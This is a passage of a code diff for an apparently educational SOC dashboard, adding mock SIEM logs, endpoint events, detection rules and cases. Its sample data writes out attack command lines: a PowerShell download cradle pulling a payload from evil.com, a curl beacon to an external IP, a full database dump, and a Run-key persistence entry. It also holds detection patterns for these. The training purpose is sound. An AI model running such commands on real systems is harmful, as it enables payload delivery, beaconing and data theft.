@@ -20,7 +20,14 @@ import {
   Eye,
   Terminal,
   Server,
-  Globe
+  Globe,
+  Code,
+  Briefcase,
+  MapPin,
+  User,
+  Building,
+  ToggleLeft,
+  ToggleRight
 } from "lucide-react";
 import { clsx } from "clsx";
 import { Badge } from "@/components/ui/badge";
@@ -47,7 +54,24 @@ interface LogEntry {
   timestamp: string;
   level: "error" | "warn" | "info" | "debug";
   source: string;
+  sourceType: "windows" | "linux" | "cloud" | "network" | "endpoint";
+  eventId?: string;
   message: string;
+  rawLog?: string;
+  normalized: {
+    eventType: string;
+    user?: string;
+    host?: string;
+    ip?: string;
+    process?: string;
+    action?: string;
+  };
+  enrichment?: {
+    geoip?: { country: string; city: string; isp: string };
+    userContext?: { department: string; role: string; riskScore: number };
+    assetCriticality?: "critical" | "high" | "medium" | "low";
+    reputation?: "malicious" | "suspicious" | "clean" | "unknown";
+  };
   details?: Record<string, string>;
 }
 
@@ -55,19 +79,59 @@ interface NetworkEvent {
   timestamp: string;
   srcIp: string;
   destIp: string;
-  port: number;
+  srcPort: number;
+  destPort: number;
   protocol: string;
   action: "allow" | "deny" | "alert";
   bytes: number;
+  packets: number;
+  direction: "inbound" | "outbound" | "internal";
+  enrichment?: {
+    srcGeo?: { country: string; city: string };
+    destGeo?: { country: string; city: string };
+    srcReputation?: string;
+    destReputation?: string;
+  };
 }
 
 interface EndpointActivity {
   hostname: string;
   timestamp: string;
   eventType: string;
+  eventId: string;
   process?: string;
+  parentProcess?: string;
+  commandLine?: string;
   user?: string;
+  hash?: string;
   status: "normal" | "suspicious" | "malicious";
+  mitreTechnique?: string;
+}
+
+interface DetectionRule {
+  id: string;
+  name: string;
+  description: string;
+  severity: "critical" | "high" | "medium" | "low";
+  enabled: boolean;
+  logic: string;
+  mitreId?: string;
+  mitreTactic?: string;
+  threshold?: { count: number; timeWindow: string };
+  lastTriggered?: string;
+  triggerCount: number;
+}
+
+interface Case {
+  id: string;
+  title: string;
+  status: "open" | "investigating" | "pending" | "closed";
+  priority: "critical" | "high" | "medium" | "low";
+  assignee?: string;
+  alertIds: string[];
+  createdAt: string;
+  updatedAt: string;
+  notes: string[];
 }
 
 interface SOCDashboardProps {
@@ -173,34 +237,355 @@ const generateMockAlerts = (labId: number): SIEMAlert[] => {
 
 const generateMockLogs = (): LogEntry[] => {
   return [
-    { timestamp: new Date(Date.now() - 30000).toISOString(), level: "error", source: "cloudtrail", message: "DeleteTrail API called by user 'unknown-admin'", details: { eventSource: "cloudtrail.amazonaws.com", userAgent: "aws-cli/2.0" } },
-    { timestamp: new Date(Date.now() - 60000).toISOString(), level: "warn", source: "guardduty", message: "CryptoMining DNS request detected from i-0abc123", details: { destination: "pool.minexmr.com" } },
-    { timestamp: new Date(Date.now() - 90000).toISOString(), level: "warn", source: "vpc-flow", message: "Unusual outbound traffic volume detected (2.4GB/hr)", details: { instanceId: "i-0def456" } },
-    { timestamp: new Date(Date.now() - 120000).toISOString(), level: "info", source: "iam", message: "AssumeRole successful for role 'AdminAccess'", details: { sourceIp: "198.51.100.45" } },
-    { timestamp: new Date(Date.now() - 150000).toISOString(), level: "info", source: "s3", message: "GetBucketAcl called on 'prod-data-bucket'", details: { requester: "arn:aws:iam::123456789012:user/dev-user" } },
-    { timestamp: new Date(Date.now() - 180000).toISOString(), level: "error", source: "lambda", message: "Function 'DataExporter' timeout after 900s", details: { memoryUsed: "512MB" } },
-    { timestamp: new Date(Date.now() - 210000).toISOString(), level: "debug", source: "ec2", message: "Instance i-0ghi789 health check passed" },
-    { timestamp: new Date(Date.now() - 240000).toISOString(), level: "warn", source: "securityhub", message: "New HIGH severity finding: Public S3 bucket detected" }
+    // Windows Security Events
+    {
+      timestamp: new Date(Date.now() - 5000).toISOString(),
+      level: "error",
+      source: "DC01.corp.local",
+      sourceType: "windows",
+      eventId: "4625",
+      message: "An account failed to log on",
+      rawLog: "EventID=4625 LogonType=3 TargetUserName=Administrator FailureReason=%%2313 IpAddress=198.51.100.45",
+      normalized: { eventType: "Authentication Failure", user: "Administrator", host: "DC01", ip: "198.51.100.45", action: "failure" },
+      enrichment: { geoip: { country: "Russia", city: "Moscow", isp: "Evil Corp ISP" }, reputation: "malicious", assetCriticality: "critical" },
+      details: { LogonType: "3 (Network)", FailureReason: "Unknown user name or bad password" }
+    },
+    {
+      timestamp: new Date(Date.now() - 15000).toISOString(),
+      level: "warn",
+      source: "DC01.corp.local",
+      sourceType: "windows",
+      eventId: "4768",
+      message: "Kerberos authentication ticket (TGT) was requested",
+      rawLog: "EventID=4768 TargetUserName=svc_backup PreAuthType=0x0 IpAddress=10.0.1.50",
+      normalized: { eventType: "Kerberos TGT Request", user: "svc_backup", host: "DC01", ip: "10.0.1.50", action: "success" },
+      enrichment: { userContext: { department: "IT", role: "Service Account", riskScore: 75 }, assetCriticality: "critical" },
+      details: { PreAuthType: "0 (Logon without Pre-Auth)", ServiceName: "krbtgt" }
+    },
+    {
+      timestamp: new Date(Date.now() - 25000).toISOString(),
+      level: "error",
+      source: "WS-FINANCE-01",
+      sourceType: "windows",
+      eventId: "4688",
+      message: "A new process has been created",
+      rawLog: "EventID=4688 NewProcessName=powershell.exe CommandLine=IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+      normalized: { eventType: "Process Creation", user: "jsmith", host: "WS-FINANCE-01", process: "powershell.exe", action: "execute" },
+      enrichment: { userContext: { department: "Finance", role: "Analyst", riskScore: 90 }, assetCriticality: "high", reputation: "malicious" },
+      details: { ParentProcess: "cmd.exe", CommandLine: "IEX(New-Object Net.WebClient).DownloadString(...)" }
+    },
+    // Linux Syslog
+    {
+      timestamp: new Date(Date.now() - 35000).toISOString(),
+      level: "warn",
+      source: "web-server-01",
+      sourceType: "linux",
+      eventId: "sshd",
+      message: "Failed password for invalid user admin from 203.0.113.100 port 54321 ssh2",
+      rawLog: "Dec 29 12:34:56 web-server-01 sshd[12345]: Failed password for invalid user admin from 203.0.113.100",
+      normalized: { eventType: "SSH Auth Failure", user: "admin (invalid)", host: "web-server-01", ip: "203.0.113.100", action: "failure" },
+      enrichment: { geoip: { country: "China", city: "Beijing", isp: "China Telecom" }, reputation: "suspicious" },
+      details: { facility: "auth", port: "54321", protocol: "ssh2" }
+    },
+    {
+      timestamp: new Date(Date.now() - 45000).toISOString(),
+      level: "error",
+      source: "db-server-01",
+      sourceType: "linux",
+      eventId: "sudo",
+      message: "user NOT in sudoers; TTY=pts/0; PWD=/home/contractor; USER=root; COMMAND=/bin/bash",
+      rawLog: "Dec 29 12:34:00 db-server-01 sudo: contractor : user NOT in sudoers",
+      normalized: { eventType: "Privilege Escalation Attempt", user: "contractor", host: "db-server-01", process: "sudo", action: "denied" },
+      enrichment: { userContext: { department: "External", role: "Contractor", riskScore: 85 }, assetCriticality: "critical" },
+      details: { targetUser: "root", command: "/bin/bash" }
+    },
+    // Cloud Telemetry (AWS CloudTrail)
+    {
+      timestamp: new Date(Date.now() - 55000).toISOString(),
+      level: "error",
+      source: "CloudTrail",
+      sourceType: "cloud",
+      eventId: "DeleteTrail",
+      message: "CloudTrail trail 'security-logs' was deleted by user 'compromised-admin'",
+      rawLog: '{"eventSource":"cloudtrail.amazonaws.com","eventName":"DeleteTrail","userIdentity":{"userName":"compromised-admin"}}',
+      normalized: { eventType: "Defense Evasion", user: "compromised-admin", action: "delete" },
+      enrichment: { geoip: { country: "Romania", city: "Bucharest", isp: "Bulletproof Hosting" }, reputation: "malicious", assetCriticality: "critical" },
+      details: { eventSource: "cloudtrail.amazonaws.com", trailName: "security-logs", sourceIPAddress: "185.220.101.45" }
+    },
+    {
+      timestamp: new Date(Date.now() - 65000).toISOString(),
+      level: "warn",
+      source: "CloudTrail",
+      sourceType: "cloud",
+      eventId: "ConsoleLogin",
+      message: "AWS Console login from unusual location (first seen from this country)",
+      rawLog: '{"eventSource":"signin.amazonaws.com","eventName":"ConsoleLogin","sourceIPAddress":"178.128.45.67"}',
+      normalized: { eventType: "Anomalous Login", user: "dev-user", ip: "178.128.45.67", action: "success" },
+      enrichment: { geoip: { country: "Netherlands", city: "Amsterdam", isp: "DigitalOcean" }, userContext: { department: "Engineering", role: "Developer", riskScore: 65 }, reputation: "suspicious" },
+      details: { mfaUsed: "No", userAgent: "Mozilla/5.0 (Windows NT 10.0)" }
+    },
+    {
+      timestamp: new Date(Date.now() - 75000).toISOString(),
+      level: "info",
+      source: "GuardDuty",
+      sourceType: "cloud",
+      eventId: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
+      message: "Credentials from EC2 instance i-0abc123def456 being used from external IP",
+      rawLog: '{"type":"UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS","resource":{"instanceId":"i-0abc123def456"}}',
+      normalized: { eventType: "Credential Theft", ip: "45.33.32.156", action: "exfiltration" },
+      enrichment: { geoip: { country: "USA", city: "Fremont", isp: "Linode" }, reputation: "suspicious", assetCriticality: "high" },
+      details: { instanceId: "i-0abc123def456", externalIp: "45.33.32.156" }
+    },
+    // Network/Firewall Logs
+    {
+      timestamp: new Date(Date.now() - 85000).toISOString(),
+      level: "warn",
+      source: "VPC-Flow",
+      sourceType: "network",
+      eventId: "REJECT",
+      message: "Rejected connection attempt to database port from internet",
+      rawLog: "2 123456789012 eni-abc123 198.51.100.77 10.0.2.50 52419 3306 6 1 40 REJECT OK",
+      normalized: { eventType: "Blocked Connection", ip: "198.51.100.77", host: "10.0.2.50", action: "reject" },
+      enrichment: { geoip: { country: "Brazil", city: "Sao Paulo", isp: "Unknown" }, reputation: "malicious" },
+      details: { srcPort: "52419", dstPort: "3306 (MySQL)", protocol: "TCP" }
+    }
   ];
 };
 
 const generateNetworkEvents = (): NetworkEvent[] => {
   return [
-    { timestamp: new Date(Date.now() - 10000).toISOString(), srcIp: "10.0.1.50", destIp: "198.51.100.45", port: 443, protocol: "HTTPS", action: "allow", bytes: 15234 },
-    { timestamp: new Date(Date.now() - 20000).toISOString(), srcIp: "198.51.100.45", destIp: "10.0.1.50", port: 22, protocol: "SSH", action: "alert", bytes: 8456 },
-    { timestamp: new Date(Date.now() - 30000).toISOString(), srcIp: "10.0.2.100", destIp: "pool.minexmr.com", port: 3333, protocol: "TCP", action: "deny", bytes: 0 },
-    { timestamp: new Date(Date.now() - 40000).toISOString(), srcIp: "10.0.1.25", destIp: "s3.amazonaws.com", port: 443, protocol: "HTTPS", action: "allow", bytes: 2456000 },
-    { timestamp: new Date(Date.now() - 50000).toISOString(), srcIp: "203.0.113.50", destIp: "10.0.1.10", port: 3389, protocol: "RDP", action: "deny", bytes: 0 }
+    { 
+      timestamp: new Date(Date.now() - 10000).toISOString(), 
+      srcIp: "10.0.1.50", destIp: "198.51.100.45", 
+      srcPort: 54321, destPort: 443, 
+      protocol: "HTTPS", action: "allow", bytes: 15234, packets: 45,
+      direction: "outbound",
+      enrichment: { destGeo: { country: "USA", city: "Ashburn" }, destReputation: "clean" }
+    },
+    { 
+      timestamp: new Date(Date.now() - 20000).toISOString(), 
+      srcIp: "198.51.100.45", destIp: "10.0.1.50", 
+      srcPort: 4444, destPort: 22, 
+      protocol: "SSH", action: "alert", bytes: 8456, packets: 120,
+      direction: "inbound",
+      enrichment: { srcGeo: { country: "Russia", city: "Moscow" }, srcReputation: "malicious" }
+    },
+    { 
+      timestamp: new Date(Date.now() - 30000).toISOString(), 
+      srcIp: "10.0.2.100", destIp: "185.220.101.45", 
+      srcPort: 49152, destPort: 3333, 
+      protocol: "TCP", action: "deny", bytes: 0, packets: 3,
+      direction: "outbound",
+      enrichment: { destGeo: { country: "Romania", city: "Bucharest" }, destReputation: "malicious" }
+    },
+    { 
+      timestamp: new Date(Date.now() - 40000).toISOString(), 
+      srcIp: "10.0.1.25", destIp: "52.216.109.45", 
+      srcPort: 55555, destPort: 443, 
+      protocol: "HTTPS", action: "allow", bytes: 2456000, packets: 1500,
+      direction: "outbound",
+      enrichment: { destGeo: { country: "USA", city: "Ashburn" }, destReputation: "clean" }
+    },
+    { 
+      timestamp: new Date(Date.now() - 50000).toISOString(), 
+      srcIp: "203.0.113.50", destIp: "10.0.1.10", 
+      srcPort: 12345, destPort: 3389, 
+      protocol: "RDP", action: "deny", bytes: 0, packets: 5,
+      direction: "inbound",
+      enrichment: { srcGeo: { country: "China", city: "Shanghai" }, srcReputation: "suspicious" }
+    },
+    { 
+      timestamp: new Date(Date.now() - 60000).toISOString(), 
+      srcIp: "10.0.1.50", destIp: "10.0.2.50", 
+      srcPort: 49200, destPort: 445, 
+      protocol: "SMB", action: "allow", bytes: 45000, packets: 200,
+      direction: "internal",
+      enrichment: {}
+    }
   ];
 };
 
 const generateEndpointActivity = (): EndpointActivity[] => {
   return [
-    { hostname: "web-server-01", timestamp: new Date(Date.now() - 15000).toISOString(), eventType: "Process Start", process: "curl", user: "ec2-user", status: "suspicious" },
-    { hostname: "db-server-01", timestamp: new Date(Date.now() - 45000).toISOString(), eventType: "File Access", process: "mysqldump", user: "root", status: "normal" },
-    { hostname: "web-server-03", timestamp: new Date(Date.now() - 75000).toISOString(), eventType: "Network Connection", process: "xmrig", user: "www-data", status: "malicious" },
-    { hostname: "app-server-02", timestamp: new Date(Date.now() - 105000).toISOString(), eventType: "Registry Modify", process: "powershell.exe", user: "SYSTEM", status: "suspicious" },
-    { hostname: "bastion-01", timestamp: new Date(Date.now() - 135000).toISOString(), eventType: "User Login", user: "admin", status: "normal" }
+    { 
+      hostname: "WS-FINANCE-01", 
+      timestamp: new Date(Date.now() - 15000).toISOString(), 
+      eventType: "Process Creation", 
+      eventId: "4688",
+      process: "powershell.exe", 
+      parentProcess: "cmd.exe",
+      commandLine: "powershell.exe -enc SQBFAFgA...",
+      user: "jsmith", 
+      hash: "a1b2c3d4e5f6...",
+      status: "malicious",
+      mitreTechnique: "T1059.001"
+    },
+    { 
+      hostname: "DC01", 
+      timestamp: new Date(Date.now() - 25000).toISOString(), 
+      eventType: "Logon", 
+      eventId: "4624",
+      user: "svc_backup", 
+      status: "suspicious",
+      mitreTechnique: "T1078"
+    },
+    { 
+      hostname: "web-server-01", 
+      timestamp: new Date(Date.now() - 35000).toISOString(), 
+      eventType: "Network Connection", 
+      eventId: "3",
+      process: "curl", 
+      parentProcess: "bash",
+      commandLine: "curl -s http://185.220.101.45/beacon",
+      user: "www-data", 
+      status: "malicious",
+      mitreTechnique: "T1071.001"
+    },
+    { 
+      hostname: "db-server-01", 
+      timestamp: new Date(Date.now() - 45000).toISOString(), 
+      eventType: "File Access", 
+      eventId: "11",
+      process: "mysqldump", 
+      parentProcess: "bash",
+      commandLine: "mysqldump --all-databases > /tmp/dump.sql",
+      user: "root", 
+      status: "suspicious",
+      mitreTechnique: "T1005"
+    },
+    { 
+      hostname: "app-server-02", 
+      timestamp: new Date(Date.now() - 55000).toISOString(), 
+      eventType: "Registry Modify", 
+      eventId: "13",
+      process: "reg.exe", 
+      parentProcess: "cmd.exe",
+      commandLine: "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      user: "SYSTEM", 
+      status: "malicious",
+      mitreTechnique: "T1547.001"
+    },
+    { 
+      hostname: "bastion-01", 
+      timestamp: new Date(Date.now() - 65000).toISOString(), 
+      eventType: "SSH Login", 
+      eventId: "accepted",
+      user: "admin", 
+      status: "normal"
+    }
+  ];
+};
+
+const generateDetectionRules = (): DetectionRule[] => {
+  return [
+    {
+      id: "DET-001",
+      name: "Brute Force Detection",
+      description: "Detects multiple failed login attempts followed by success",
+      severity: "high",
+      enabled: true,
+      logic: "count(EventID=4625) > 5 within 5m THEN EventID=4624 from same IP",
+      mitreId: "T1110",
+      mitreTactic: "Credential Access",
+      threshold: { count: 5, timeWindow: "5m" },
+      lastTriggered: new Date(Date.now() - 300000).toISOString(),
+      triggerCount: 23
+    },
+    {
+      id: "DET-002",
+      name: "Impossible Travel",
+      description: "Login from geographically impossible locations within short timeframe",
+      severity: "critical",
+      enabled: true,
+      logic: "login_1.geo != login_2.geo AND time_diff < 2h AND distance > 500mi",
+      mitreId: "T1078",
+      mitreTactic: "Initial Access",
+      threshold: { count: 1, timeWindow: "2h" },
+      lastTriggered: new Date(Date.now() - 7200000).toISOString(),
+      triggerCount: 5
+    },
+    {
+      id: "DET-003",
+      name: "Suspicious PowerShell Execution",
+      description: "Encoded PowerShell commands or known malicious patterns",
+      severity: "high",
+      enabled: true,
+      logic: "process=powershell.exe AND (cmdline contains '-enc' OR cmdline contains 'IEX' OR cmdline contains 'DownloadString')",
+      mitreId: "T1059.001",
+      mitreTactic: "Execution",
+      triggerCount: 47
+    },
+    {
+      id: "DET-004",
+      name: "CloudTrail Tampering",
+      description: "Attempts to disable or delete CloudTrail logging",
+      severity: "critical",
+      enabled: true,
+      logic: "eventName IN ('DeleteTrail', 'StopLogging', 'UpdateTrail') AND NOT user IN whitelist",
+      mitreId: "T1562.008",
+      mitreTactic: "Defense Evasion",
+      triggerCount: 3
+    },
+    {
+      id: "DET-005",
+      name: "Lateral Movement via SMB",
+      description: "Internal SMB connections to multiple hosts in short time",
+      severity: "medium",
+      enabled: true,
+      logic: "dest_port=445 AND unique(dest_ip) > 5 within 10m",
+      mitreId: "T1021.002",
+      mitreTactic: "Lateral Movement",
+      threshold: { count: 5, timeWindow: "10m" },
+      triggerCount: 12
+    },
+    {
+      id: "DET-006",
+      name: "Crypto Mining Activity",
+      description: "Connections to known mining pools or high GPU usage",
+      severity: "medium",
+      enabled: true,
+      logic: "dest contains 'pool.' OR dest contains 'mining' OR process='xmrig'",
+      mitreId: "T1496",
+      mitreTactic: "Impact",
+      triggerCount: 8
+    }
+  ];
+};
+
+const generateCases = (): Case[] => {
+  return [
+    {
+      id: "CASE-2024-001",
+      title: "Credential Compromise Investigation",
+      status: "investigating",
+      priority: "critical",
+      assignee: "analyst-1",
+      alertIds: ["ALT-001", "ALT-004"],
+      createdAt: new Date(Date.now() - 3600000).toISOString(),
+      updatedAt: new Date(Date.now() - 600000).toISOString(),
+      notes: ["Initial triage complete", "User credentials rotated", "Awaiting forensics review"]
+    },
+    {
+      id: "CASE-2024-002",
+      title: "Potential Data Exfiltration",
+      status: "open",
+      priority: "high",
+      alertIds: ["ALT-002"],
+      createdAt: new Date(Date.now() - 1800000).toISOString(),
+      updatedAt: new Date(Date.now() - 1800000).toISOString(),
+      notes: ["S3 bucket permissions reviewed"]
+    },
+    {
+      id: "CASE-2024-003",
+      title: "Cryptomining Malware",
+      status: "pending",
+      priority: "medium",
+      assignee: "analyst-2",
+      alertIds: ["ALT-003"],
+      createdAt: new Date(Date.now() - 86400000).toISOString(),
+      updatedAt: new Date(Date.now() - 43200000).toISOString(),
+      notes: ["Instance isolated", "Malware sample captured", "Pending IR team review"]
+    }
   ];
 };
 
@@ -224,15 +609,24 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
   const [logs, setLogs] = useState<LogEntry[]>([]);
   const [networkEvents, setNetworkEvents] = useState<NetworkEvent[]>([]);
   const [endpointActivity, setEndpointActivity] = useState<EndpointActivity[]>([]);
+  const [detectionRules, setDetectionRules] = useState<DetectionRule[]>([]);
+  const [cases, setCases] = useState<Case[]>([]);
   const [activeTab, setActiveTab] = useState("alerts");
   const [filterSeverity, setFilterSeverity] = useState<string>("all");
+  const [logSourceFilter, setLogSourceFilter] = useState<string>("all");
 
   useEffect(() => {
     setAlerts(generateMockAlerts(labId));
     setLogs(generateMockLogs());
     setNetworkEvents(generateNetworkEvents());
     setEndpointActivity(generateEndpointActivity());
+    setDetectionRules(generateDetectionRules());
+    setCases(generateCases());
   }, [labId]);
+  
+  const filteredLogs = logs.filter(l => 
+    logSourceFilter === "all" || l.sourceType === logSourceFilter
+  );
 
   const filteredAlerts = alerts.filter(a => 
     filterSeverity === "all" || a.severity === filterSeverity
@@ -284,12 +678,18 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
       </div>
 
       <Tabs value={activeTab} onValueChange={setActiveTab} className="flex-1 flex flex-col min-h-0">
-        <TabsList className="w-full justify-start rounded-none border-b border-white/10 bg-black/20 px-2">
+        <TabsList className="w-full justify-start rounded-none border-b border-white/10 bg-black/20 px-2 overflow-x-auto flex-nowrap">
           <TabsTrigger value="alerts" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
             <AlertTriangle className="w-3 h-3" /> ALERTS
           </TabsTrigger>
           <TabsTrigger value="logs" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
             <FileText className="w-3 h-3" /> LOGS
+          </TabsTrigger>
+          <TabsTrigger value="detections" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
+            <Code className="w-3 h-3" /> DETECTIONS
+          </TabsTrigger>
+          <TabsTrigger value="cases" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
+            <Briefcase className="w-3 h-3" /> CASES
           </TabsTrigger>
           <TabsTrigger value="network" className="text-[10px] font-mono gap-1 data-[state=active]:bg-primary/20 data-[state=active]:text-primary">
             <Network className="w-3 h-3" /> NETWORK
@@ -504,47 +904,166 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
           </div>
         </TabsContent>
 
-        <TabsContent value="logs" className="flex-1 m-0 overflow-hidden">
-          <ScrollArea className="h-full">
-            <div className="p-2 font-mono text-[10px] space-y-1">
-              {logs.map((log, idx) => (
-                <motion.div
-                  key={idx}
-                  initial={{ opacity: 0 }}
-                  animate={{ opacity: 1 }}
-                  transition={{ delay: idx * 0.02 }}
+        <TabsContent value="logs" className="flex-1 m-0 overflow-hidden flex flex-col">
+          {/* Log Source Filter */}
+          <div className="flex items-center gap-2 px-3 py-2 border-b border-white/5 flex-shrink-0">
+            <Filter className="w-3 h-3 text-muted-foreground" />
+            <div className="flex gap-1 flex-wrap">
+              {["all", "windows", "linux", "cloud", "network"].map(src => (
+                <button
+                  key={src}
+                  onClick={() => setLogSourceFilter(src)}
                   className={clsx(
-                    "p-2 rounded border-l-2",
-                    log.level === "error" ? "bg-red-500/10 border-l-red-500 text-red-300" :
-                    log.level === "warn" ? "bg-yellow-500/10 border-l-yellow-500 text-yellow-300" :
-                    log.level === "info" ? "bg-blue-500/10 border-l-blue-500 text-blue-300" :
-                    "bg-slate-500/10 border-l-slate-500 text-slate-300"
+                    "px-2 py-0.5 text-[9px] font-mono rounded uppercase transition-all",
+                    logSourceFilter === src 
+                      ? "bg-primary/20 text-primary border border-primary/40" 
+                      : "text-muted-foreground hover:text-white"
                   )}
-                  data-testid={`log-${idx}`}
+                  data-testid={`log-filter-${src}`}
                 >
-                  <div className="flex items-center gap-2 mb-1">
-                    <span className="text-muted-foreground">{formatTime(log.timestamp)}</span>
-                    <Badge variant="outline" className={clsx(
-                      "text-[8px] px-1 py-0 uppercase",
-                      log.level === "error" ? "text-red-400 border-red-400/30" :
-                      log.level === "warn" ? "text-yellow-400 border-yellow-400/30" :
-                      log.level === "info" ? "text-blue-400 border-blue-400/30" :
-                      "text-slate-400 border-slate-400/30"
-                    )}>
-                      {log.level}
-                    </Badge>
-                    <span className="text-primary">[{log.source}]</span>
-                  </div>
-                  <p className="text-white/90">{log.message}</p>
-                  {log.details && (
-                    <div className="mt-1 text-[9px] text-muted-foreground">
-                      {Object.entries(log.details).map(([k, v]) => (
-                        <span key={k} className="mr-3">{k}=<span className="text-cyan-400">{v}</span></span>
-                      ))}
-                    </div>
-                  )}
-                </motion.div>
+                  {src}
+                </button>
               ))}
+            </div>
+          </div>
+          <ScrollArea className="flex-1">
+            <div className="p-2 font-mono text-[10px] space-y-2">
+              {filteredLogs.map((log, idx) => {
+                const sourceTypeIcons: Record<string, string> = {
+                  windows: "WIN",
+                  linux: "LNX", 
+                  cloud: "CLD",
+                  network: "NET",
+                  endpoint: "EDR"
+                };
+                return (
+                  <motion.div
+                    key={idx}
+                    initial={{ opacity: 0 }}
+                    animate={{ opacity: 1 }}
+                    transition={{ delay: idx * 0.02 }}
+                    className={clsx(
+                      "p-3 rounded-lg border",
+                      log.level === "error" ? "bg-red-500/10 border-red-500/30" :
+                      log.level === "warn" ? "bg-yellow-500/10 border-yellow-500/30" :
+                      log.level === "info" ? "bg-blue-500/10 border-blue-500/30" :
+                      "bg-slate-500/10 border-slate-500/30"
+                    )}
+                    data-testid={`log-${idx}`}
+                  >
+                    {/* Log Header */}
+                    <div className="flex items-center gap-2 mb-2 flex-wrap">
+                      <span className="text-muted-foreground">{formatTime(log.timestamp)}</span>
+                      <Badge variant="outline" className="text-[8px] px-1.5 py-0">
+                        {sourceTypeIcons[log.sourceType] || "LOG"}
+                      </Badge>
+                      <Badge variant="outline" className={clsx(
+                        "text-[8px] px-1 py-0 uppercase",
+                        log.level === "error" ? "text-red-400 border-red-400/30" :
+                        log.level === "warn" ? "text-yellow-400 border-yellow-400/30" :
+                        log.level === "info" ? "text-blue-400 border-blue-400/30" :
+                        "text-slate-400 border-slate-400/30"
+                      )}>
+                        {log.level}
+                      </Badge>
+                      {log.eventId && (
+                        <Badge variant="outline" className="text-[8px] px-1 py-0 text-cyan-400 border-cyan-400/30">
+                          {log.eventId}
+                        </Badge>
+                      )}
+                      <span className="text-primary">[{log.source}]</span>
+                    </div>
+                    
+                    {/* Message */}
+                    <p className="text-white/90 mb-2">{log.message}</p>
+                    
+                    {/* Normalized Fields */}
+                    <div className="bg-black/30 rounded p-2 mb-2 space-y-1">
+                      <div className="text-[9px] text-primary uppercase mb-1">Normalized Fields</div>
+                      <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-[9px]">
+                        <div><span className="text-muted-foreground">Type:</span> <span className="text-white">{log.normalized.eventType}</span></div>
+                        {log.normalized.user && <div><span className="text-muted-foreground">User:</span> <span className="text-purple-400">{log.normalized.user}</span></div>}
+                        {log.normalized.host && <div><span className="text-muted-foreground">Host:</span> <span className="text-cyan-400">{log.normalized.host}</span></div>}
+                        {log.normalized.ip && <div><span className="text-muted-foreground">IP:</span> <span className="text-orange-400">{log.normalized.ip}</span></div>}
+                        {log.normalized.process && <div><span className="text-muted-foreground">Process:</span> <span className="text-yellow-400">{log.normalized.process}</span></div>}
+                        {log.normalized.action && <div><span className="text-muted-foreground">Action:</span> <span className={log.normalized.action === "failure" || log.normalized.action === "denied" ? "text-red-400" : "text-green-400"}>{log.normalized.action}</span></div>}
+                      </div>
+                    </div>
+                    
+                    {/* Enrichment Data */}
+                    {log.enrichment && (
+                      <div className="bg-cyan-500/5 rounded p-2 mb-2 border border-cyan-500/20">
+                        <div className="text-[9px] text-cyan-400 uppercase mb-1 flex items-center gap-1">
+                          <Zap className="w-2.5 h-2.5" /> Enrichment
+                        </div>
+                        <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-[9px]">
+                          {log.enrichment.geoip && (
+                            <div className="flex items-center gap-1">
+                              <MapPin className="w-2.5 h-2.5 text-muted-foreground" />
+                              <span className="text-white">{log.enrichment.geoip.city}, {log.enrichment.geoip.country}</span>
+                              <span className="text-muted-foreground">({log.enrichment.geoip.isp})</span>
+                            </div>
+                          )}
+                          {log.enrichment.userContext && (
+                            <div className="flex items-center gap-1">
+                              <Building className="w-2.5 h-2.5 text-muted-foreground" />
+                              <span className="text-white">{log.enrichment.userContext.department}</span>
+                              <span className="text-muted-foreground">({log.enrichment.userContext.role})</span>
+                              <Badge className={clsx(
+                                "text-[7px] px-1 py-0",
+                                log.enrichment.userContext.riskScore > 75 ? "bg-red-500/20 text-red-400" :
+                                log.enrichment.userContext.riskScore > 50 ? "bg-yellow-500/20 text-yellow-400" :
+                                "bg-green-500/20 text-green-400"
+                              )}>
+                                Risk: {log.enrichment.userContext.riskScore}
+                              </Badge>
+                            </div>
+                          )}
+                          {log.enrichment.assetCriticality && (
+                            <div className="flex items-center gap-1">
+                              <Server className="w-2.5 h-2.5 text-muted-foreground" />
+                              <span className="text-muted-foreground">Asset:</span>
+                              <Badge className={clsx(
+                                "text-[7px] px-1 py-0",
+                                log.enrichment.assetCriticality === "critical" ? "bg-red-500/20 text-red-400" :
+                                log.enrichment.assetCriticality === "high" ? "bg-orange-500/20 text-orange-400" :
+                                log.enrichment.assetCriticality === "medium" ? "bg-yellow-500/20 text-yellow-400" :
+                                "bg-green-500/20 text-green-400"
+                              )}>
+                                {log.enrichment.assetCriticality.toUpperCase()}
+                              </Badge>
+                            </div>
+                          )}
+                          {log.enrichment.reputation && (
+                            <div className="flex items-center gap-1">
+                              <Shield className="w-2.5 h-2.5 text-muted-foreground" />
+                              <span className="text-muted-foreground">Reputation:</span>
+                              <Badge className={clsx(
+                                "text-[7px] px-1 py-0",
+                                log.enrichment.reputation === "malicious" ? "bg-red-500/20 text-red-400" :
+                                log.enrichment.reputation === "suspicious" ? "bg-yellow-500/20 text-yellow-400" :
+                                log.enrichment.reputation === "clean" ? "bg-green-500/20 text-green-400" :
+                                "bg-slate-500/20 text-slate-400"
+                              )}>
+                                {log.enrichment.reputation.toUpperCase()}
+                              </Badge>
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    )}
+                    
+                    {/* Raw Details */}
+                    {log.details && (
+                      <div className="text-[9px] text-muted-foreground">
+                        {Object.entries(log.details).map(([k, v]) => (
+                          <span key={k} className="mr-3">{k}=<span className="text-cyan-400">{v}</span></span>
+                        ))}
+                      </div>
+                    )}
+                  </motion.div>
+                );
+              })}
             </div>
           </ScrollArea>
         </TabsContent>
@@ -556,6 +1075,7 @@ export function SOCDashboard({ labId, labCategory, onAlertSelect, selectedAlertI
                 <thead>
                   <tr className="text-muted-foreground border-b border-white/10">
                     <th className="text-left py-2 px-2">TIME</th>
+                    <th className="text-left py-2 px-2">DIR</th>
